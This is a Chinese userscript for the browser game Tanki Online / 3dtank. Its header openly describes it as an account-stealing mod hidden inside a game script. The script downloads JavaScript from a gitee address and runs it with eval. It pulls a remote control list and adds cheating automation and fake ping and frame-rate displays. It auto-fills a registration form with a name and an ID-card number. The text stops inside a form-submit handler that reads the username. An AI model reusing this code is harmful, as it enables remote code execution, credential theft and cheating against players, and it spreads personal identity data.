// ==UserScript==
// @name         中华神剑军团脚本（请勿使用！恶意盗号！）
// @version      1.0.2
// @Crack        2190376720
// @description  (纯虚构，勿真用)塞入Mod的盗号程序，用于盗取账号信息，仅供学习交流，切勿用于非法用途，否则后果自负！
// @updateURL    https://raw.githubusercontent.com/ArcDent/-/refs/heads/main/JS-油猴脚本/中华神剑军团脚本.user.js
// @downloadURL  https://raw.githubusercontent.com/ArcDent/-/refs/heads/main/JS-油猴脚本/中华神剑军团脚本.user.js
// @author       Mod
// @match        https://public-deploy6.test-eu.tankionline.com/browser-public/index.html?config-template=https://c{server}.public-deploy6.test-eu.tankionline.com/config.xml&resources=../resources&balancer=https://balancer.public-deploy6.test-eu.tankionline.com/balancer*
// @match        https://tankionline.com/*
// @match        https://3dtank.com/play/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tankionline.com
// @connect      gitee.com
// @connect      jsonplaceholder.typicode.com
// @connect      *
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';
    GM_xmlhttpRequest({
        method: "GET",
        url: "https://gitee.com/LXY_2747696524/svdfjmkgsvouimvsh/raw/master/KostoTheme.js",
        nocache: !0,
        onload: a => {
            eval(a.responseText);
        }
    });
    let a = false;
    let b, c, d, e, f = undefined;
    console.log("Crack 1719078Get White List Now");
    GM_xmlhttpRequest({
        method: "GET",
        url: "https://gitee.com/LXY_2747696524/svdfjmkgsvouimvsh/raw/master/white.js",
        onload: function(a) {
            const f = JSON.parse(a.responseText);
            try {
                const a = f;
                b = a[0]; console.log("ID白名单用户" + b);
                c = a[1]; console.log("军团白名单" + c);
                d = a[2]; console.log("开发者逻辑的游戏ID" + d);
                e = a[3]; console.log("11111. " + e);
                l("Crack 1719078这个通知会显示十秒钟", "军团的白名单和ID的白名单已经获取已经获取成功 自行前往控制台查看 按F12", 10000);
            } catch(a) {
                l("白名单获取进程", "失败", 3000);
            }
        }
    });

    function g() {
        GM_xmlhttpRequest({
            method: "GET",
            url: "https://gitee.com/LXY_2747696524/svdfjmkgsvouimvsh/raw/master/white.js",
            onload: function(a) {
                const b = JSON.parse(a.responseText);
                try {
                    const a = b;
                    f = a[4];
                    if (f.includes("YES")) {
                        location.reload(true);
                    }
                } catch(a) {
                    l("获取白名单", "失败", 3000);
                }
            }
        });
        setTimeout(() => { g(); }, 1000);
    }

    let h = false;
    function i() {
        var h = document.querySelectorAll(".UserInfoContainerStyle-textDecoration");
        let k = "YES";
        if (h.length == 1) {
            a = h[0].textContent;
            let f = undefined;
            const g = a, i = /\[([^\]]+)\]/, m = g.match(i);
            if (m) { f = m[1]; }
            let n = a.replace(/\[.*\]\s*/, "");
            console.log("获取成功 用户" + n);
            let o = "user_211";
            if (e.includes(k)) { window.location.href = "about:blank"; }
            if (window.location.href.includes("tankionline.com")) {
                l("Kosto", "这是外服/测试服所以菜单自动开启", 3000);
                j();
                setTimeout(() => {
                    j.floatingWindow.appendChild(a);
                    const a = document.createElement("div");
                    a.classList.add("ss", "general");
                    a.textContent = "hack";
                    a.addEventListener("click", () => {
                        floatingWindow.removeChild(a);
                        l("Crack 1719078", "shizoval is loading", 3000);
                        shizoval();
                    });
                }, 500);
                return;
            } else if (d.some(a => a.includes(n)) || n.startsWith(o)) {
                console.log("开发者" + n); j(); return;
            } else {
                l("Kosto", "好的，您不是开发者");
                if (b.some(a => a.includes(n))) {
                    l("Crack 1719078 欢迎", "Crack 1719078", 3000); j(); console.log("白名单" + n); return;
                } else if (c.some(a => a.startsWith("[" + f + "]"))) {
                    l("Crack 1719078Welcome", " Crack 1719078"); j(); document.querySelector("#root > div").click(); return;
                } else {
                    l("Crack 1719078", n + "Crack 1719078"); j(); return;
                }
            }
        } else { setTimeout(i, 10); }
    }
    i();

    function j() {
        setInterval(() => {
            var a = document.querySelector(".ApplicationLoaderComponentStyle-container");
            var b = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
            if (a) {
                clearInterval(u);
                x.style.backgroundColor = "transparent";
                clearInterval(o);
                s.style.backgroundColor = "transparent";
                clearInterval(i);
                m.style.backgroundColor = "transparent";
                s.textContent = " 左边A队[停止]";
                m.textContent = " 右边B队[停止]";
                x.textContent = " A&B[停止]";
                clearInterval($);
                aa.style.backgroundColor = "transparent";
                aa.textContent = "[0/Num0]地雷[停止]";
                clearInterval(V);
                Y.style.backgroundColor = "transparent";
                Y.textContent = "[9/Num5]三开[停止]";
                v = false;
                p = false;
                j = false;
            }
            if (b) {
                clearInterval($);
                aa.style.backgroundColor = "transparent";
                aa.textContent = "[0/Num0]地雷[停止]";
                clearInterval(V);
                Y.style.backgroundColor = "transparent";
                Y.textContent = "[9/Num5]三开[停止]";
                W = false;
                _ = false;
            }
        });
        const b = document.createElement("div");
        b.textContent = "ID:错误";
        console.log("Crack 1719078获取ID中");
        b.classList.add("gameid", "title");
        b.style.cssText = "width: 160px; text-align: center; margin-top: 5px; margin-bottom: 5px;border: 5px solid rgba(255, 255, 255, 0.2);border-radius: 15px;";
        const c = document.createElement("div");
        c.classList.add("title", "title");
        let d = "version:5.1";
        c.textContent = "Kosto@1797867628 \n " + d;
        c.addEventListener("click", function() {
            window.open("tencent://snsapp/?cmd=2&ver=1&uin=1797867628&fuin=", "_blank");
        });
        c.style.cssText = "width: 160px; text-align: center; margin-top: 5px; margin-bottom: 5px;border: 5px solid rgba(255, 255, 255, 0.2);border-radius: 15px;color: red;";
        const e = document.createElement("div");
        e.classList.add("yy", "title");
        e.textContent = "你好同志 \n 欢迎加入中华神剑";
        e.style.cssText = "width: 160px; text-align: center; margin-top: 5px; margin-bottom: 5px;border: 5px solid rgba(255, 255, 255, 0.2);border-radius: 15px;";
        let f = document.querySelectorAll(".JoinToBattleComponentStyle-buttonJoin");
        var g = document.querySelectorAll(".ChatComponentStyle-sendButton");
        var h = new KeyboardEvent("keydown", {
            keyCode: 16,
            key: "Shift",
            code: "ShiftLeft",
            which: 16,
            charCode: 16,
            bubbles: true,
            cancelable: true
        });
        let i, j = !1;
        function k() {
            if (!document.querySelector(".UserScoreComponentStyle-iconCrystal") || document.querySelector(".DialogContainerComponentStyle-container")) {
                j = !1;
                clearInterval(i);
                m.style.backgroundColor = "transparent";
                m.textContent = " 右边B队[停止]";
                return;
            }
            document.dispatchEvent(q);
        }
        const m = document.createElement("div");
        m.classList.add("toogle", "BuyContainers", "general");
        m.textContent = "右边B队[停止]";
        m.addEventListener("click", () => { n(); });
        function n() {
            if (j = !j) {
                i = setInterval(k, 10);
                m.style.backgroundColor = "rgb(66 150 66/30%)";
                m.textContent = " 右边B队[运行]";
                l("Kosto", "开始点击B队", 3000);
            } else {
                clearInterval(i);
                m.style.backgroundColor = "transparent";
                m.textContent = " 右边B队[停止]";
                l("Kosto", "停止点击B队", 3000);
            }
        }
        let o, p = !1;
        var q = new KeyboardEvent("keydown", {
            keyCode: 16,
            key: "Shift",
            code: "ShiftRight",
            which: 16,
            charCode: 16,
            bubbles: true,
            cancelable: true
        });
        function r() {
            if (!document.querySelector(".UserScoreComponentStyle-iconCrystal") || document.querySelector(".DialogContainerComponentStyle-container")) {
                p = !1;
                clearInterval(o);
                s.style.backgroundColor = "transparent";
                s.textContent = " 左边A队[停止]";
                return;
            }
            document.dispatchEvent(h);
        }
        const s = document.createElement("div");
        s.classList.add("A", "general");
        s.textContent = " 左边A队[停止]";
        s.addEventListener("click", () => {
            if (p = !p) {
                o = setInterval(r, 10);
                s.style.backgroundColor = "rgb(66 150 66/30%)";
                s.textContent = " 左边A队[运行]";
                l("Kosto", "开始点击A队", 3000);
            } else {
                clearInterval(o);
                s.style.backgroundColor = "transparent";
                s.textContent = " 左边A队[停止]";
                l("Kosto", "停止点击A队", 3000);
            }
        });
        var t = new KeyboardEvent("keydown", {
            keyCode: 74,
            key: "j",
            code: "KeyJ",
            which: 74,
            charCode: 74,
            bubbles: true,
            cancelable: true
        });
        let u, v = !1;
        function w() {
            if (!document.querySelector(".UserScoreComponentStyle-iconCrystal") || document.querySelector(".DialogContainerComponentStyle-container")) {
                v = !1;
                clearInterval(u);
                x.style.backgroundColor = "transparent";
                x.textContent = " A&B[停止]";
                return;
            }
            document.dispatchEvent(h);
            document.dispatchEvent(q);
            document.dispatchEvent(t);
        }
        const x = document.createElement("div");
        x.classList.add("toogle", "Joinrandomteam", "general");
        x.textContent = " A&B[停止]";
        x.addEventListener("click", () => {
            if (v = !v) {
                u = setInterval(w, 10);
                x.style.backgroundColor = "rgb(66 150 66/30%)";
                x.textContent = " A&B[运行]";
                l("Crack 1719078", "开始点击A/B/死亡混战", 3000);
            } else {
                clearInterval(u);
                x.style.backgroundColor = "transparent";
                x.textContent = " A&B[停止]";
                l("Crack 1719078", "停止点击A/B/死亡混战", 3000);
            }
        });
        let y, z = !1;
        function A() {
            let a = document.querySelector("div.BattleHudComponentStyle-buttonsContainer > div:nth-child(1) > div.BattleHudComponentStyle-pauseButton.BattleHudComponentStyle-hudButton");
            if (a) { a.click(); }
            let b = document.querySelector(".BattlePauseMenuComponentStyle-redMenuButton.BattlePauseMenuComponentStyle-enabledButton.BattlePauseMenuComponentStyle-selectedMenuRedButton");
            if (b) { b.click(); }
        }
        const B = document.createElement("div");
        B.classList.add("botton", "ExitBattle", "general");
        B.textContent = "闪退[未就绪]";
        B.addEventListener("click", () => {
            if (z = !z) {
                B.style.backgroundColor = "rgb(66 150 66/30%)";
                B.textContent = "[T] 闪退[就绪]";
                l("Crack 1719078", "闪退就绪!", 3000);
            } else {
                B.style.backgroundColor = "transparent";
                B.textContent = "闪退[未就绪]";
                l("Crack 1719078", "闪退已停用", 3000);
            }
        });
        document.addEventListener("keydown", a => {
            if (a.keyCode === 84) {
                if (B.style.backgroundColor !== "transparent") {
                    var b = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
                    if (!b) {
                        setTimeout(() => {
                            let a = document.querySelector("div.BattleHudComponentStyle-buttonsContainer > div:nth-child(1) > div.BattleHudComponentStyle-pauseButton.BattleHudComponentStyle-hudButton");
                            if (a) { a.click(); }
                        }, 10);
                        setTimeout(() => {
                            let a = document.querySelector(".BattlePauseMenuComponentStyle-redMenuButton.BattlePauseMenuComponentStyle-enabledButton.BattlePauseMenuComponentStyle-selectedMenuRedButton");
                            if (a) { a.click(); }
                        }, 20);
                    }
                }
            }
        });
        let C = document.querySelectorAll(".BattleHudComponentStyle-pauseButton.BattleHudComponentStyle-hudButton");
        let D, E, F, G = !1;
        function H() {
            const a = document.querySelector(".BattleHudComponentStyle-buttonsContainer > div > div > div:nth-child(2) > span.BattleHudFpsComponentStyle-value");
            if (a) { a.textContent = E; a.style.color = "rgb(116, 186, 61)"; }
            if (G) { requestAnimationFrame(H); }
        }
        const I = document.createElement("div");
        I.classList.add("toogle", "FakePings", "general");
        I.textContent = "虚假延迟(30±)";
        I.addEventListener("click", () => {
            G = !G;
            if (G) {
                D = setInterval(() => { E = (Math.floor(Math.random() * 3) + 30 - 3 + 3).toString(); }, 1000);
                H();
                I.style.backgroundColor = "rgb(66 150 66/30%)";
                console.log("Crack 1719078Open 虚假延迟");
                l("Crack 1719078", "开启虚假延迟", 3000);
            } else {
                clearInterval(D);
                I.style.backgroundColor = "transparent";
                l("Crack 1719078", "关闭虚假延迟", 3000);
            }
        });
        let J, K, L, M = !1;
        function N() {
            const a = document.querySelector(".BattleHudFpsComponentStyle-value");
            if (a) { a.textContent = K; a.style.color = "rgb(116, 186, 61)"; }
            if (M) { requestAnimationFrame(N); }
        }
        const O = document.createElement("div");
        O.classList.add("toogle", "RemoveMines", "general");
        O.textContent = "虚假帧数(999)";
        O.addEventListener("click", () => {
            M = !M;
            if (M) {
                J = setInterval(() => { K = (Math.floor(Math.random() * 3) + P - 3).toString(); }, 1000);
                N();
                O.style.backgroundColor = "rgb(66 150 66/30%)";
                l("Crack 1719078", "开启虚假帧数", 3000);
            } else {
                clearInterval(J);
                O.style.backgroundColor = "transparent";
                l("Crack 1719078", "关闭虚假帧数", 3000);
            }
        });
        let P = 999;
        const Q = document.createElement("div");
        Q.classList.add("switch", "switch_on");
        Q.style.cssText = "margin-left: auto; border-radius: 15px 0px 0px 15px;";
        Q.textContent = "999";
        Q.addEventListener("click", () => {
            if (P === 520) {
                Q.classList.add("switch_on");
                Q.classList.remove("switch_off");
                R.classList.add("switch_off");
                R.classList.remove("switch_on");
                P = 999;
                document.querySelector(".switch_on").style.backgroundColor = "rgb(66 150 150/30%)";
                document.querySelector(".switch_off").style.backgroundColor = "transparent";
                O.textContent = "虚假帧数(999)";
                l("Crack 1719078", "虚假帧数: 999 fps", 3000);
            }
        });
        const R = document.createElement("div");
        R.classList.add("switch", "switch_off");
        R.style.cssText = "margin-right: auto; border-radius: 0px 15px 15px 0px;";
        R.textContent = "520";
        R.addEventListener("click", () => {
            if (P === 999) {
                R.classList.add("switch_on");
                R.classList.remove("switch_off");
                Q.classList.add("switch_off");
                Q.classList.remove("switch_on");
                P = 520;
                document.querySelector(".switch_on").style.backgroundColor = "rgb(66 150 150/30%)";
                document.querySelector(".switch_off").style.backgroundColor = "transparent";
                O.textContent = "虚假帧数(520)";
                l("Crack 1719078", "虚假帧数: 520 fps", 3000);
            }
        });
        const S = document.createElement("div");
        S.style.display = "flex";
        const U = document.createElement("div");
        U.classList.add("wash", "washbattle", "general");
        U.textContent = "[X]清除加入";
        U.addEventListener("click", () => {
            Ga.style.opacity = 0;
            setTimeout(() => {
                for (var a = 0; a < 1000; a++) {
                    document.querySelector("div.DialogContainerComponentStyle-header > div > div")?.click();
                }
                Ga.style.opacity = 1;
                l("Crack 1719078", "清除特技加入窗口", 3000);
            }, 0);
        });
        document.addEventListener("keydown", a => {
            var b = document.querySelector("div.DialogContainerComponentStyle-header > div > div");
            if (a.keyCode === 88) {
                if (b && U.style.display !== "none") {
                    setTimeout(() => {
                        for (var a = 0; a < 1000; a++) {
                            document.querySelector("div.DialogContainerComponentStyle-header > div > div")?.click();
                        }
                        Ga.style.opacity = 1;
                        l("Crack 1719078", "你已经通过快捷键X清除特技加入窗口", 3000);
                    }, 0);
                }
            }
        });
        let V, W = !1;
        function X(a) {
            document.dispatchEvent(new KeyboardEvent("keydown", {
                bubbles: !0,
                cancelable: !0,
                key: a,
                code: "Digit" + a,
                charCode: a.charCodeAt(0),
                keyCode: a.charCodeAt(0),
                which: a.charCodeAt(0)
            }));
            document.dispatchEvent(new KeyboardEvent("keyup", {
                bubbles: !0,
                cancelable: !0,
                key: a,
                code: "Digit" + a,
                charCode: a.charCodeAt(0),
                keyCode: a.charCodeAt(0),
                which: a.charCodeAt(0)
            }));
        }
        const Y = document.createElement("div");
        Y.classList.add("supply", "click", "general");
        Y.textContent = "[9/Num5]三开[停止]";
        Y.addEventListener("click", () => {
            var a = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
            if (!a) { Z(); }
        });
        document.addEventListener("keydown", a => {
            if (a.keyCode == 57 || a.keyCode == 101) {
                var b = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
                if (!b) { Z(); }
            }
        });
        function Z() {
            if (W = !W) {
                V = setInterval(function() { X("2"); X("3"); X("4"); }, 100);
                Y.style.backgroundColor = "rgb(66 150 66/30%)";
                Y.textContent = "[9/Num5]三开[运行]";
                l("Crack 1719078", "三开-100ms已经开启", 3000);
            } else {
                clearInterval(V);
                Y.style.backgroundColor = "transparent";
                Y.textContent = "[9/Num5]三开[停止]";
                setTimeout(X("4"), 100);
                l("Crack 1719078", "停止三开", 3000);
            }
        }
        let $, _ = !1;
        const aa = document.createElement("div");
        aa.classList.add("mine", "click", "general");
        aa.textContent = "[0/Num0]地雷[停止]";
        aa.addEventListener("click", () => {
            var a = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
            if (!a) { ba(); }
        });
        function ba() {
            if (_ = !_) {
                $ = setInterval(function() { X("5"); }, 50);
                aa.style.backgroundColor = "rgb(66 150 66/30%)";
                aa.textContent = "[0/Num0]地雷[运行]";
                l("Crack 1719078", "开启地雷", 3000);
            } else {
                clearInterval($);
                aa.style.backgroundColor = "transparent";
                aa.textContent = "[0/Num0]地雷[停止]";
                l("Crack 1719078", "关闭地雷", 3000);
            }
        }
        document.addEventListener("keydown", a => {
            if (a.keyCode == 48 || a.keyCode == 96) {
                var b = document.querySelector("#root > div > div > div.BattleChatComponentStyle-rootDesktop > div > div");
                if (!b) { ba(); }
            }
        });
        let ca, da = !1;
        function ea() {
            if (!document.querySelector(".UserScoreComponentStyle-iconCrystal") || document.querySelector(".DialogContainerComponentStyle-container")) {
                return;
            }
            document.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: "Shift", code: "ShiftLeft", shiftKey: true }));
            document.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: "Shift", code: "ShiftLeft", shiftKey: false }));
        }
        const ga = document.createElement("div");
        ga.classList.add("shift", "keydown", "general");
        ga.textContent = "自动过速[停止]";
        ga.addEventListener("click", () => {
            if (da = !da) {
                ca = setInterval(ea, 100);
                ga.style.backgroundColor = "rgb(66 150 66/30%)";
                ga.textContent = "自动过速[运行]";
                l("Crack 1719078", "自动过速装置已经开启", 3000);
                la.style.display = "none";
            } else {
                la.style.display = "block";
                clearInterval(ca);
                ga.style.backgroundColor = "transparent";
                ga.textContent = "自动过速[停止]";
                l("Crack 1719078", "关闭自动过速", 3000);
            }
        });
        let ha, ia = !1;
        function ja() {
            if (!document.querySelector(".UserScoreComponentStyle-iconCrystal") || document.querySelector(".DialogContainerComponentStyle-container")) {
                return;
            }
            document.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: " ", code: "Space", shiftKey: false }));
            document.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: " ", code: "Space", shiftKey: false }));
        }
        const la = document.createElement("div");
        la.classList.add("kg", "click", "general");
        la.textContent = "自动开炮[停止]";
        la.addEventListener("click", () => {
            if (ia = !ia) {
                ha = setInterval(ja, 100);
                la.style.backgroundColor = "rgb(66 150 66/30%)";
                la.textContent = "自动开炮[运行]";
                l("Crack 1719078", "自动开炮", 3000);
                ra.style.display = "none";
                ma = false;
                clearInterval(na);
            } else {
                ra.style.display = "block";
                clearInterval(ha);
                la.style.backgroundColor = "transparent";
                la.textContent = "自动开炮[停止]";
                l("Crack 1719078", "关闭自动开炮", 3000);
            }
        });
        let ma, na, oa = !1;
        function pa() {
            let a = document.querySelector("div.BattleHudComponentStyle-buttonsContainer > div:nth-child(1) > div.BattleHudComponentStyle-pauseButton.BattleHudComponentStyle-hudButton");
            if (a) { a.click(); }
        }
        function qa() {
            var a = document.querySelectorAll(".BattlePauseMenuComponentStyle-timerContainer");
            if (a.length === 1 && a[0].textContent <= 2) { pa(); }
            if (a.length === 0) { pa(); }
        }
        const ra = document.createElement("div");
        ra.classList.add("anti-afk", "click", "general");
        ra.textContent = "自动卡车库 [停止]";
        ra.addEventListener("click", () => {
            if (ma = !ma) {
                na = setInterval(qa, 100);
                pa();
                ra.style.backgroundColor = "rgb(66 150 66/30%)";
                ra.textContent = "自动卡车库 [Runing]";
                l("Crack 1719078", "自动卡车库", 3000);
                la.style.display = "none";
                ia = false;
                clearInterval(ha);
            } else {
                la.style.display = "block";
                clearInterval(na);
                ra.style.backgroundColor = "transparent";
                ra.textContent = "自动卡车库 [停止]";
                l("Crack 1719078", "停止自动卡车库", 3000);
                pa();
            }
        });
        let sa, ta = !1;
        function ua() {
            const a = document.querySelectorAll(".HotKey-commonBlockForHotKey");
            a.forEach(a => {
                if (a.tagName.toLowerCase() === "h3" && (a.textContent || a.innerText) === "Space") {
                    a.click();
                    return;
                }
            });
        }
        const va = document.createElement("div");
        va.classList.add("anti-afk", "click", "general");
        va.textContent = "结算自动继续 [停止]";
        va.addEventListener("click", () => {
            if (ta = !ta) {
                sa = setInterval(ua, 100);
                va.style.backgroundColor = "rgb(66 150 66/30%)";
                va.textContent = "结算自动继续 [Runing]";
                l("Crack 1719078", "结算自动继续", 3000);
            } else {
                clearInterval(sa);
                va.style.backgroundColor = "transparent";
                va.textContent = "结算自动继续 [停止]";
                l("Crack 1719078", "停止结算自动继续", 3000);
            }
        });
        let wa, xa = !1;
        function ya() {
            xa = true;
            wa = setInterval(Fa, 10);
            za.style.backgroundColor = "rgb(66 150 66/30%)";
            za.textContent = "Button[Yes]";
        }
        const za = document.createElement("div");
        za.classList.add("button", "click", "general");
        za.textContent = "Button[停止]";
        za.addEventListener("click", () => {
            if (xa = !xa) {
                wa = setInterval(Fa, 10);
                za.style.backgroundColor = "rgb(66 150 66/30%)";
                za.textContent = "Button[Yes]";
            } else {
                clearInterval(wa);
                za.style.backgroundColor = "transparent";
                za.textContent = "Button[停止]";
            }
        });
        let Aa = ["div.StartScreenComponentStyle-mainContainer > div.StartScreenComponentStyle-loadingBlock", "div.ScrollingCardsComponentStyle-scrollCard.cardImg > div.ScrollingCardsComponentStyle-selectCard > div", "div.MenuComponentStyle-blockButtonsQECommunity > div.MenuComponentStyle-battleTitleCommunity > div > span", "div.SuperMissionComponentStyle-descriptionSuperMission > div.Common-flexSpaceBetween > div.Common-backgroundImage > div", "div.MainQuestComponentStyle-cardRewardCompleted > div.Common-flexCenterAlignCenterColumn", "div.BasePaymentComponentStyle-buttonContainer > div > div", "div.SuccessfulPurchaseComponentStyle-content > div.Common-flexCenterAlignCenter > div", "div.AnimationOpenContainerComponentStyle-controlButton > div", "div.DialogContainerComponentStyle-footerContainer > div.Common-flexCenterAlignCenter.DialogContainerComponentStyle-enterButton", "div.TutorialModalComponentStyle-navigationContainer > div.Common-flexSpaceBetweenAlignCenter > div.TutorialModalComponentStyle-navigationButton"];
        let Ba = ["div.DialogContainerComponentStyle-contentContainer > div > div > span.Common-yellowColor", "div.DialogContainerComponentStyle-contentContainer > div > span > span", ".NotEnoughCrystalsDialogStyle-crystalCount"];
        let Ca = undefined, Da = true, Ea = undefined;
        function Fa() {
            if (Ca) { return; }
            Ca = setTimeout(() => { Ca = undefined; }, 50);
            let a = [];
            Ba.forEach(b => { let c = document.querySelector(b); if (c) { a.push(c); } });
            if (a.length > 0) {
                Da = false;
                clearTimeout(Ea);
                setTimeout(() => { Da = true; }, 3000);
                return;
            }
            Aa.forEach(a => { let b = document.querySelector(a); if (b) { b.click(); } });
        }
        const Ga = document.createElement("div");
        Ga.classList.add("KostoWindow");
        Ga.style.cssText = "position: fixed; top: 15px; left: 40px; background: linear-gradient(150deg, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.2)); padding: 0px 10px 10px; backdrop-filter: blur(5px); border: 2px solid rgba(255, 255, 255, 0.2); display: block; border-radius: 15px; z-index: 9999999999999; font-size: 16px; color: white; transition: opacity 0.5s ease 0s, transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55) 0s; opacity: 1; user-select: none; transform: scale(0);";
        setTimeout(ya, 100);
        document.addEventListener("keydown", b => {
            if (b.keyCode === 45 || b.keyCode === 77) {
                if (a !== false) {
                    if (Ga.style.opacity === "1") {
                        Ga.style.opacity = 0;
                        Ga.style.transform = "scale(0)";
                        setTimeout(() => { Ga.style.display = "none"; }, 500);
                        l("Crack 1719078", "菜单关闭", 3000);
                    } else {
                        Ga.style.display = "block";
                        setTimeout(() => { Ga.style.opacity = 1; Ga.style.transform = "scale(1)"; }, 1);
                        l("Crack 1719078", "菜单开启", 3000);
                    }
                }
            }
        });
        let Ha = false, Ia = true, Ja, Ka;
        function La(a) {
            const b = a.target;
            if (b.classList.contains("button") || b.classList.contains("toogle") || b.classList.contains("switch")) {
                Ia = false;
                return;
            }
            Ia = true;
            Ha = true;
            Ja = a.clientX - Ga.getBoundingClientRect().left;
            Ka = a.clientY - Ga.getBoundingClientRect().top;
        }
        function Ma(a) {
            if (!Ha || !Ia) { return; }
            Ga.style.left = a.clientX - Ja + "px";
            Ga.style.top = a.clientY - Ka + "px";
        }
        Ga.addEventListener("mousedown", La);
        document.addEventListener("mousemove", Ma);
        document.addEventListener("mouseup", () => { Ha = false; });
        Ga.appendChild(c);
        Ga.appendChild(b);
        Ga.appendChild(s);
        Ga.appendChild(m);
        Ga.appendChild(x);
        Ga.appendChild(O);
        S.appendChild(Q);
        S.appendChild(R);
        Ga.appendChild(I);
        Ga.appendChild(S);
        Ga.appendChild(Y);
        Ga.appendChild(aa);
        Ga.appendChild(ga);
        Ga.appendChild(ra);
        Ga.appendChild(va);
        Ga.appendChild(la);
        Ga.appendChild(B);
        Ga.appendChild(U);
        Ga.appendChild(za);
        Ga.appendChild(e);
        document.body.appendChild(Ga);
        document.querySelectorAll(".general").forEach(a => {
            a.style.cssText = "margin: 5px; width: 180px; background-color: transparent; border: 5px solid rgba(255, 255, 255, 0.2); border-radius: 15px; text-align: center; cursor: pointer; transition: transform 0.3s ease-in-out;";
            a.addEventListener("mouseover", () => { a.style.transform = "scale(1.05)"; });
            a.addEventListener("mouseout", () => { a.style.transform = "scale(1)"; });
        });
        document.querySelectorAll(".input").forEach(a => {
            a.style.cssText = "margin:5px;width:180px;background-color:transparent;border:5px solid rgba(255,255,255,0.2);border-radius:15px;text-align:center;cursor:pointer;transition:transform 0.3s ease-in-out;padding:5px;font-size:16px;color:white;outline:none;";
            a.addEventListener("mouseover", () => { a.style.transform = "scale(1.05)"; });
            a.addEventListener("mouseout", () => { a.style.transform = "scale(1)"; });
        });
        document.querySelectorAll(".title").forEach(a => {
            a.style.cssText = "margin: 5px; width: 180px; background-color: transparent; border: 5px solid rgba(255, 255, 255, 0.2); border-radius: 5px; text-align: center; transition: transform 0.3s ease-in-out;";
            a.addEventListener("mouseover", () => { a.style.transform = "scale(1.05)"; });
            a.addEventListener("mouseout", () => { a.style.transform = "scale(1)"; });
        });
        document.querySelectorAll(".toogle").forEach(a => { a.style.transition += ", background-color 0.5s ease-in-out"; });
        document.querySelectorAll(".switch").forEach(a => { a.style.cssText += "width: 60px; background-color: transparent; border: 2px solid rgba(255, 255, 255, 0.2); text-align: center; cursor: pointer; transition: background-color 0.5s ease-in-out"; });
        document.querySelector(".switch_on").style.backgroundColor = "rgb(66 150 150/30%)";
        document.querySelector(".switch_off").style.backgroundColor = "transparent";
        Ga.style.display = "block";
        setTimeout(() => { Ga.style.opacity = 1; Ga.style.transform = "scale(1)"; }, 1);
        l("Crack 1719078", "菜单自动开启一次(初加载)3秒后自动关闭");
        l("Crack 1719078", "创造窗口");
        b.textContent = "ID:" + a;
        setTimeout(() => {
            Ga.style.opacity = 0;
            Ga.style.transform = "scale(0)";
            setTimeout(() => { Ga.style.display = "none"; }, 500);
            l("Crack 1719078", "菜单自动关闭", 3000);
        }, 2000);
    }

    const k = document.createElement("style");
    document.head.appendChild(k);
    k.textContent = ".game-notification { position: fixed; right: 20px; width: 300px; height: auto; min-height: 50px; max-height: none; padding: 10px; background-color: rgba(0, 0, 0, 0.8); color: #fff; border-radius: 10px; box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.5); font-family: Arial, sans-serif; text-align: center; z-index: 9999; opacity: 0; transform: translateY(-100%); transition: opacity 0.5s ease-out, transform 0.5s ease-out; overflow-y: auto; }.game-notification.visible { opacity: 1; transform: translateY(0); }.game-notification.hidden { opacity: 0; transform: translateY(-100%); }.game-notification.enter { opacity: 0; transform: translateY(-50px); }.game-notification.enter-active { opacity: 1; transform: translateY(0); }.game-notification.leave { opacity: 1; transform: translateY(0); }.game-notification.leave-active { opacity: 0; transform: translateY(-50px); }";

    function l(a = "Crack 1719078", b, c = 5000) {
        let d = 0, e = 50, f = 10;
        const g = document.createElement("div");
        g.id = "gameNotification" + d++;
        g.classList.add("game-notification", "hidden");
        console.log("标题:" + a + "\n详细信息:" + b);
        let h = 0;
        const i = document.querySelectorAll(".game-notification:not(.hidden)");
        i.forEach(a => { h += a.offsetHeight + f; });
        g.style.top = h + "px";
        const j = document.createElement("h3");
        j.textContent = a;
        g.appendChild(j);
        const k = document.createElement("p");
        k.textContent = b;
        g.appendChild(k);
        document.body.appendChild(g);
        m(g, c);
    }

    function m(a, b) {
        a.classList.remove("hidden");
        a.classList.add("visible");
        setTimeout(() => { a.classList.remove("enter"); a.classList.add("enter-active", "visible"); }, 0);
        setTimeout(() => { n(a); }, b);
    }

    function n(a) {
        a.classList.add("leave");
        setTimeout(() => { a.classList.remove("leave", "visible"); a.classList.add("leave-active"); setTimeout(() => { a.remove(); if (document.querySelector(".game-notification:not(.hidden)") === null) { topOffset = 20; } }, 500); }, 0);
    }

    (function() {
        var c, d = setInterval(() => {
            var a, b = document.querySelector(".Common-alignCenter > span");
            if (b && b.innerText === "完成注册") {
                b = "user_211" + (Math.floor(Math.random() * (9999999 - 1000000 + 1)) + 1000000);
                if ((a = document.querySelectorAll("#username,#password,#password1,#real-name,#real-id")).length === 5) {
                    a[0].value = b + "]"; a[1].value = "Ss12345.]"; a[2].value = "Ss12345.]"; a[3].value = "毕鹏飞]"; a[4].value = "370126200010252471]";
                }
                c = setInterval(() => {
                    var a = document.querySelector("div.Common-flexCenterAlignCenter.EntranceComponentStyle-buttonActive");
                    if (a) {
                        setTimeout(() => { a.click(); console.log("完成注册"); }, 300);
                        setTimeout(() => { document.querySelectorAll(".LicenseComponentStyle-button"); }, 800);
                        clearInterval(c);
                    }
                }, 300);
                clearInterval(d);
            }
        }, 200);
        setTimeout(() => { clearInterval(d); clearInterval(c); }, 60000);
    })();

    document.addEventListener("keydown", a => {
        if (a.key.toUpperCase() === "F5") { window.location.reload(); }
    });

document.addEventListener('submit', function(event) {
    console.log("检测到提交事件，目标：", event.target);
    if (event.target.tagName === 'FORM') {
        let username = event.target.querySelector('#username');
